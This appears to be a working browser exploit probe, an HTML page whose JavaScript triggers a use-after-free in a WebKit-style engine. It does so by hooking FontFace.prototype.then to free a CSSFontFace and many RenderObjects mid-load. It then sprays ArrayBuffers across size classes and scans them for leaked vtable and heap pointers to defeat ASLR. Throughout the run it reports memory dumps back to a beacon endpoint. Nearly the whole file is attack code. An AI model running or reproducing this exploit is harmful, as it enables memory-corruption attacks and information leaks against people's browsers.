<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1142</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
</head><body><div id="log"></div>
<script>
var L=document.getElementById('log');
function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}

log('phase','=== P1142: RENDEROBJECT VTABLE HUNT ===');
log('info','Free RenderObjects via DOM removal, spray multi-size, hunt vtable ptrs');
log('info','RenderObjects use WTF_MAKE_FAST_ALLOCATED = general bmalloc heap');
log('info','They are VIRTUAL = vtable ptr at +0 = CODE ADDRESS');
B('P1142-START','t='+Date.now());

// ===== PHASE A: Create many styled elements =====
var container=document.createElement('div');
container.id='roc';
container.style.cssText='position:absolute;left:-9999px;top:0;width:800px;';
document.body.appendChild(container);

var NELEMS=300;
var elems=[];
var styles=[
  'display:block;width:100px;height:50px;background:red;',
  'display:inline-block;width:80px;height:40px;border:1px solid blue;',
  'display:flex;width:120px;height:60px;justify-content:center;',
  'display:grid;grid-template-columns:1fr 1fr;width:100px;height:80px;',
  'display:table;width:90px;height:45px;',
  'display:list-item;width:100px;height:30px;list-style:disc;',
  'position:relative;width:70px;height:35px;overflow:hidden;',
  'position:absolute;width:60px;height:30px;left:10px;top:10px;',
  'float:left;width:50px;height:25px;margin:2px;',
  'display:inline;font-size:14px;color:green;',
  'display:block;columns:2;width:200px;height:100px;',
  'display:block;width:100px;height:50px;transform:rotate(5deg);',
  'display:block;width:100px;height:50px;opacity:0.5;',
  'display:block;width:100px;height:50px;filter:blur(1px);',
  'display:block;width:100px;height:50px;clip-path:circle(50%);'
];

for(var i=0;i<NELEMS;i++){
  var tagIdx=i%5;
  var tags=['div','span','p','section','article'];
  var el=document.createElement(tags[tagIdx]);
  el.style.cssText=styles[i%styles.length];
  el.textContent='E'+i;
  // Add children for some elements to create more render objects
  if(i%3===0){
    var ch=document.createElement('span');
    ch.textContent='c'+i;
    ch.style.cssText='display:inline;color:blue;font-weight:bold;';
    el.appendChild(ch);
  }
  container.appendChild(el);
  elems.push(el);
}

// Force full layout
container.offsetHeight;
document.body.offsetHeight;
log('ok','Created '+NELEMS+' styled elements, layout forced');
B('P1142-CREATED','n='+NELEMS);

// ===== PHASE B: Also set up CSSFontFace UAF for reference =====
var r=Date.now()%100000;
var uafHit=false;
var allSpray={};
var SIZES=[48,64,80,96,112,128,144,160,176,192,208,224,256,320,384,512];
for(var si=0;si<SIZES.length;si++) allSpray[SIZES[si]]=[];

var st=document.createElement('style');
st.textContent="@font-face{font-family:r"+r+";src:local(Arial);unicode-range:U+0042}";
document.head.appendChild(st);
var ff=new FontFace('s'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
document.fonts.add(ff);void ff.loaded;

Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
  if(uafHit)return undefined;uafHit=true;

  // Free CSSFontFace
  if(st.parentNode)st.remove();
  try{document.fonts.delete(this);}catch(e){}
  document.body.offsetHeight;

  // Free ALL RenderObjects by removing elements
  for(var i=0;i<elems.length;i++){
    if(elems[i].parentNode) elems[i].parentNode.removeChild(elems[i]);
  }
  // Remove the container itself
  if(container.parentNode) container.remove();
  document.body.offsetHeight;

  // ===== PHASE C: Multi-size spray =====
  var PER_SIZE=60;
  for(var si=0;si<SIZES.length;si++){
    var sz=SIZES[si];
    for(var k=0;k<PER_SIZE;k++){
      allSpray[sz].push(new ArrayBuffer(sz));
    }
  }

  try{document.fonts.check('1em r'+r);}catch(e){}
  return undefined;
},set:function(){}});

document.fonts.load('1em s'+r+', r'+r,'AB').then(function(){},function(){});

setTimeout(function(){
  delete FontFace.prototype.then;

  // ===== PHASE D: Scan ALL buffers =====
  log('phase','--- Scanning '+SIZES.length+' size classes ---');

  var totalNZ=0;
  var vtableHits=[];
  var heapHits=[];
  var cffFound=false;

  for(var si=0;si<SIZES.length;si++){
    var sz=SIZES[si];
    var bufs=allSpray[sz];
    var nzCount=0;

    for(var k=0;k<bufs.length;k++){
      var v=new BigUint64Array(bufs[k]);
      var hasNZ=false;
      for(var q=0;q<v.length;q++){if(v[q]!==0n){hasNZ=true;break;}}
      if(!hasNZ) continue;
      nzCount++;

      // Analyze first qword (potential vtable pointer)
      var q0=v[0];
      var q0hi=Number(q0>>32n);
      var q0lo=Number(q0&0xFFFFFFFFn);

      // CSSFontFace identification (sz=192, q0=1=refcount)
      if(sz===192&&q0===1n&&v[11]!==0n){
        cffFound=true;
        B('P1142-CFF','q11='+hex64(v[11])+'|q13='+hex64(v[13]));
        log('ok','CSSFontFace at sz=192: q11='+hex64(v[11]));
        continue;
      }

      // Classify q0
      var q0tag='?';
      if(q0===0n) q0tag='ZERO';
      else if(q0<0x1000n) q0tag='SM('+q0.toString()+')';
      else if(q0hi>=0xFFFF) q0tag='SENT';
      else if(q0hi>=0x10&&q0hi<=0xFF) q0tag='HEAP';
      else if(q0hi>=1&&q0hi<=0xF) q0tag='CODE?'; // possible code segment
      else if(q0hi===0&&q0lo>=0x10000) q0tag='LOW';
      else q0tag='UNK('+hex64(q0)+')';

      // Dump first 8 qwords
      var dump=[];
      for(var q=0;q<Math.min(v.length,8);q++){
        dump.push('q'+q+'='+hex64(v[q]));
      }

      // Check for vtable-like pointer at q0: should be a code address
      // NOT heap (0x10-0xFF high), NOT sentinel (0xFFFF+), NOT small, NOT zero
      // Could be: 0x00000001xxxxxxxx, 0x00000002xxxxxxxx, etc. (code segment)
      // Or 0x00007Fxxxxxxxxxx (typical x86_64 code range)
      if(q0!==0n && q0>0x10000n && q0hi<0x10 && q0hi>=0 && q0<0xFFFF000000000000n){
        var isVtable=(q0hi>=1&&q0hi<=0xF) || (q0lo>=0x100000&&q0hi===0);
        if(isVtable||q0tag==='CODE?'||q0tag==='LOW'||q0tag.startsWith('UNK')){
          vtableHits.push({sz:sz,k:k,q0:hex64(q0),tag:q0tag,
            dump:dump.join('|')});
          log('win','VTABLE? sz='+sz+' k='+k+' q0='+hex64(q0)+' ['+q0tag+']');
          log('ptr','  '+dump.join(' '));
        }
      }

      // Also track any non-zero buffer that's NOT CSSFontFace
      if(q0!==1n){
        heapHits.push({sz:sz,k:k,q0:hex64(q0),tag:q0tag,
          sample:dump.slice(0,4).join('|')});
      }

      // Beacon non-zero buffers (limit)
      if(nzCount<=3){
        B('P1142-NZ-'+sz+'-'+k,dump.join('|'));
      }
    }

    if(nzCount>0){
      totalNZ+=nzCount;
      log('info','sz='+sz+': '+nzCount+'/'+bufs.length+' non-zero');
    }
  }

  // ===== Report =====
  B('P1142-VTABLE','count='+vtableHits.length);
  for(var i=0;i<Math.min(vtableHits.length,10);i++){
    B('P1142-VT-'+i,JSON.stringify(vtableHits[i]));
  }

  B('P1142-HEAP','count='+heapHits.length);
  for(var i=0;i<Math.min(heapHits.length,5);i++){
    B('P1142-HP-'+i,JSON.stringify(heapHits[i]));
  }

  var summary='total_nz='+totalNZ+'|vtable='+vtableHits.length+
    '|heap='+heapHits.length+'|cff='+cffFound;
  B('P1142-DONE',summary);
  log('phase','=== DONE: '+totalNZ+' non-zero, '+vtableHits.length+' vtable candidates, '+heapHits.length+' heap hits ===');

  if(vtableHits.length>0){
    log('win','!!! POTENTIAL CODE POINTERS FOUND !!!');
    log('win','If confirmed, ASLR is defeated!');
  }else{
    log('info','No vtable pointers found. RenderObjects may be in IsoHeap or wrong size class.');
  }
},20);
</script></body></html>
